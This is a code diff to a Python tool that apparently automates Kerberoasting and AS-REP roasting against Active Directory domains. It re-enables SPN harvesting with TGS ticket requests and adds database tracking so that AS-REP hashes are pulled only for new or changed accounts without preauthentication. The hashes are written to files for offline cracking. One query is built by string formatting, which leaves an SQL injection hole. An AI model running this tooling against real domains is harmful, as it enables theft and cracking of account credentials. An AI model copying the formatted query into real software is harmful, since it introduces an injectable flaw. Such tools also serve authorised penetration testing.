@@ -55,8 +55,17 @@ class Database:
                                         pwdLastSetDate text NOT NULL
                                     ); """
 
+        sql_np_table = """ CREATE TABLE IF NOT EXISTS np (
+                                        id integer PRIMARY KEY AUTOINCREMENT,
+                                        domain text NOT NULL,
+                                        sAMAccountName text NOT NULL,
+                                        pwdLastSetDate text NOT NULL
+                                    ); """
+
+
         if self.cursor is not None:
             self.create_table(sql_spn_table)
+            self.create_table(sql_np_table)
 
     def commit(self):
         self.conn.commit()
@@ -71,6 +80,34 @@ class Database:
             self.cursor.execute(create_table_sql)
         except Error as e:
             logger.info(e)
+
+    def find_np(self, domain, np):
+        samaccountname = np[0]
+        pwdlastsetDate = np[2].split(' ')[0]
+
+        npFound = True
+
+        cursor = self.cursor
+        npQuery = 'SELECT pwdLastSetDate FROM np WHERE samaccountname=\'{samAccountNameValue}\' AND domain=\'{domainValue}\''.format(samAccountNameValue=samaccountname, domainValue=domain)
+        npResult = cursor.execute(npQuery).fetchall()
+
+        if len(npResult) is 0:
+            logger.info("        ** NEW NP FOUND! Domain: "+domain+" sAMAccountName: "+samaccountname+", pulling the TGT.")
+            npFound=False
+            logger.info("        ** Adding the NP to the database.")
+            cursor.execute("INSERT INTO np (domain, sAMAccountName, pwdLastSetDate) VALUES (?,?,?)", (domain, samaccountname, pwdlastsetDate))
+        elif len(npResult) is 1:
+            if pwdlastsetDate != npResult[0][0]:
+                logger.info("        ** CHANGED PW FOUND! Domain: "+domain+" sAMAccountName: "+samaccountname+" old pwdlastsetDate value: "+npResult[0][0]+ " new pwdlastsetDate value: "+pwdlastsetDate)
+                cursor.execute("UPDATE np SET pwdLastSetDate=? WHERE sAMAccountName=?",(pwdlastsetDate, samaccountname))
+                npFound=False
+        else:
+            logger.info("        ** huh, more than 1 database match, something wrong here:")
+            logger.info("        ** domain: "+domain+" samaccountname "+ samaccountname + " pwdlastsetDate: " + pwdlastsetDate)
+            raise
+
+        self.commit()
+        return npFound
 
     def find_spn(self, domain, spn, samaccountname, pwdlastset):
         pwdlastsetDate = pwdlastset.split(' ')[0]
@@ -299,13 +336,7 @@ class Roaster:
             else:
                 raise
 
-        self.resultsNPs = []
-
-        if len(self.answersNPs)>0:
-            usernames = [answer[0] for answer in self.answersNPs]
-            self.request_multiple_TGTs(usernames)
-
-        return self.resultsNPs
+        return self.answersNPs
 
     def processRecordNP(self, item):
         if isinstance(item, ldapasn1.SearchResultEntry) is not True:
@@ -720,30 +751,37 @@ if __name__ == "__main__":
 
             # KERBEROAST
 
-            #spnAnswers = roaster.harvesterSPNs()
-            # tgsList = []
-            # for spn in spnAnswers:
-            #     logger.debug("Found SPN: "+spn[0])
-            #     newSpn = db.find_spn(targetDomain, spn[0], spn[1], spn[3])
-            #     if newSpn:
-            #         tgsList.append(newSpn)
-            #
-            # if len(tgsList)>0:
-            #     roaster.getTGS(tgsList)
-            #     if options.outputfile is not None:
-            #         logger.info("    ** Results written to: "+options.outputfile+".XX.krb5tgs, where XX is the encryption type id of the ticket.")
-            # else:
-            #     logger.info("    ** No new or changed SPNs found for domain: "+targetDomain)
+            spnAnswers = roaster.harvesterSPNs()
+            tgsList = []
+            for spn in spnAnswers:
+                logger.debug("Found SPN: "+spn[0])
+                newSpn = db.find_spn(targetDomain, spn[0], spn[1], spn[3])
+                if newSpn:
+                    tgsList.append(newSpn)
+
+            if len(tgsList)>0:
+                roaster.getTGS(tgsList)
+                if options.outputfile is not None:
+                    logger.info("    ** Results written to: "+options.outputfile+".XX.krb5tgs, where XX is the encryption type id of the ticket.")
+            else:
+                logger.info("    ** No new or changed SPNs found for domain: "+targetDomain)
 
             # ASREP ROAST
-            npResults = roaster.harvesterNPs()
+            npAnswers = roaster.harvesterNPs()
+            npsList = []
+            for np in npAnswers:
+                logger.debug("Found NP with sAMAccountName: "+np[0])
+                npFound = db.find_np(targetDomain, np)
+                if not npFound:
+                    npsList.append(np)
 
-            if len(npResults)>0:
+            if len(npsList)>0:
+                usernames = [answer[0] for answer in npsList]
+                roaster.request_multiple_TGTs(usernames)
                 if options.outputfile is not None:
                     logger.info("    ** Results written to: "+options.outputfile+".XX.krb5asrep, where XX is the encryption type id of the ticket.")
             else:
-                logger.info("    ** No NPUsers found for domain: "+targetDomain)
-
+                logger.info("    ** No new or changed NPUsers found for domain: "+targetDomain)
 
             logger.info(" ** Finished enumerating domain: "+targetDomain)
 
